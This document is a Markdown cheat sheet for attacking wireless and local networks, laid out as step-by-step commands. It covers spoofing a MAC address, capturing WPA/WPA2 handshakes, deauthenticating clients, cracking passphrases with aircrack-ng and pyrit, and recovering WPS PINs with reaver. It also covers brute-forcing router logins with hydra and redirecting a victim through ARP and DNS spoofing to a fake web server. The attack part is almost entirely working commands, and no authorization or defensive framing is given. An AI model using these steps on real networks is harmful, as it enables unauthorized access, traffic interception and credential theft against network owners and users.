# Crack WPA/WPA2

### Change MAC Address \#\#

* View interfaces

```text
iwconfig
```

* Disable card

```text
ifconfig wlan0 down
```

* Get a new random MAC address

```text
macchanger --random wlan0
```

* Enable card

```text
ifconfig wlan0 up
```

### Enable Monitor Mode

* Kill these processes BEFORE putting the card in monitor mode

```text
airmon-ng check kill
```

* Enable monitor mode

```text
airmon-ng start wlan0
```

### Disable Monitor Mode

* Take card out of monitor mode

```text
airmon-ng stop wlan0mon
```

* Restart network manager

```text
service network-manager start
```

### Find and Sniff Network

* Find the network that we want

```text
airodump-ng wlan0mon
```

* Sniff and save packets

```text
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/WPAcapture wlan0mon
```

### Deauth Attack

* Find the devices on a network

```text
airodump-ng --bssid <AP MAC> --channel <#> wlan0mon
```

* Send deauth packets

```text
aireplay-ng --deauth 2000 -a <AP MAC> -c <TARGET MAC> wlan0mon
```

### Crack WPA / WPA2 Passphrase

* Capture handshake

```text
airodump-ng --bssid <AP MAC> --channel <#> --write Desktop/Captures/WPAsample wlan0mon
```

* Loop through passwords

```text
aircrack-ng Desktop/Captures/WPAsample-01.cap -w Desktop/Lists/passwords_top_1000.txt
```

* Decrypt packets

```text
airdecap-ng -e 'HOMEWIFI' -p bacon123 Desktop/Captures/WPAsample-01.cap
```

### Use pyrit for Faster Cracking \#\#

```text
pyrit list_cores
pyrit -r <CAPTURE FILE> analyze
pyrit eval
pyrit -i <PASS FILE> import_passwords
```

## Note: If you want to import more passwords, just use the same command with a different filename

```text
pyrit -e HOMEWIFI create_essid
pyrit eval
```

* Pyrit has automatically filtered passwords that are not suitable for WPA\(2\)-PSK and also sorted out duplicates

```text
pyrit batch
pyrit -r <CAPTURE FILE> attack_db
```

* Delete ESSID from database

```text
pyrit -e HOMEWIFI delete_essid
```

* Delete passwords

```text
rm -rf .pyrit/blobspace/password/
```

### WPS Pin Recovery

* Can scan and find WPS enabled access points \#\#\#

```text
wash -i wlan0mon
```

| Flag | Description |
| :--- | :--- |
| -i | interface |
| -b | BSSID |
| -c | channel |
| -f | fixed \(disable channel hopping\) |
| -a | auto detect best advanced options for target AP |
| -w | mimic Windows 7 registrar |
| -v | very verbose \( -vv for even more \) |
| -K 1 | pixiewps mode enabled |

* **Reaver** is tool used to attack WPS

```text
reaver -i wlan0mon -b <AP MAC> -c 6 -f -a -w -vv -K 1
```

### Crack Router Login

* Make sure card is in monitor mode

```text
airmon-ng check kill
airmon-ng start wlan0
```

Go to [http://192.168.0.1/](http://192.168.0.1/) \(you must be on the network\) Look what type of router they have and Google the default credentials Most people dont change their default settings

| Flag | Description |
| :--- | :--- |
| **-e ns** | tries null and user name for password too |
| **-F** | exit when login is found |
| **-V** | displays the results in the terminal |
| **-t 4** | number of parallel tasks to run |

```text
hydra http://[192.168.0.1]/login.html -e ns -F -V -t 4 -L <USERNAMES FILE> -P <PASSWORDS FILE>
```

### DNS Spoof \(deadly\)

```text
rfkill unblock all && airmon-ng check kill && airmon-ng start wlan0
```

* Install if not already installed

#### Lets our computer act as a bridge and forward packets based on MAC rather than IP \(like a router\) \#\#\#

```text
apt-get install bridge-utils
```

* Enable IP forwarding

#### Lets us determine the path where packets are sent, usually used by routers to decide which network to send data to \(do this every time\)

```text
echo 1 > /proc/sys/net/ipv4/ip_forward
```

* Create DNS host file
* We will create a fake DNS response
* When the user asks for the IP of "bacon.com", we will give them our IP

Our actual IP = **192.168.0.11**

* Desktop/spoofhosts.txt

192.168.0.11 www\* 192.168.0.11 bacon.com

### Make fake website and start server

To host file on own computer, create and save index.html to var/www/html/

```markup
<!DOCTYPE html>
<html>
<head>
    <title>Title</title>
</head>
<body>
    <h1>Gametime</h1>
</body>
</html>
```

* Start apache

```text
apache2ctl start
```

### Start ARP and DNS spoofing

We will constantly send the victim computer ARP answers telling him that the MAC address belonging to the IP of the router is our MAC address.

* Tell the victim that our IP address is the routers
* Also tell the router that we are the victims IP

Victims IP = 192.168.0.17 Router = 192.168.0.1

* New terminal for each

```text
arpspoof -t 192.168.0.17 192.168.0.1 && arpspoof -t 192.168.0.1 192.168.0.17
dnsspoof -f Desktop/spoofhosts.txt host 192.168.0.17 and udp port 53
```

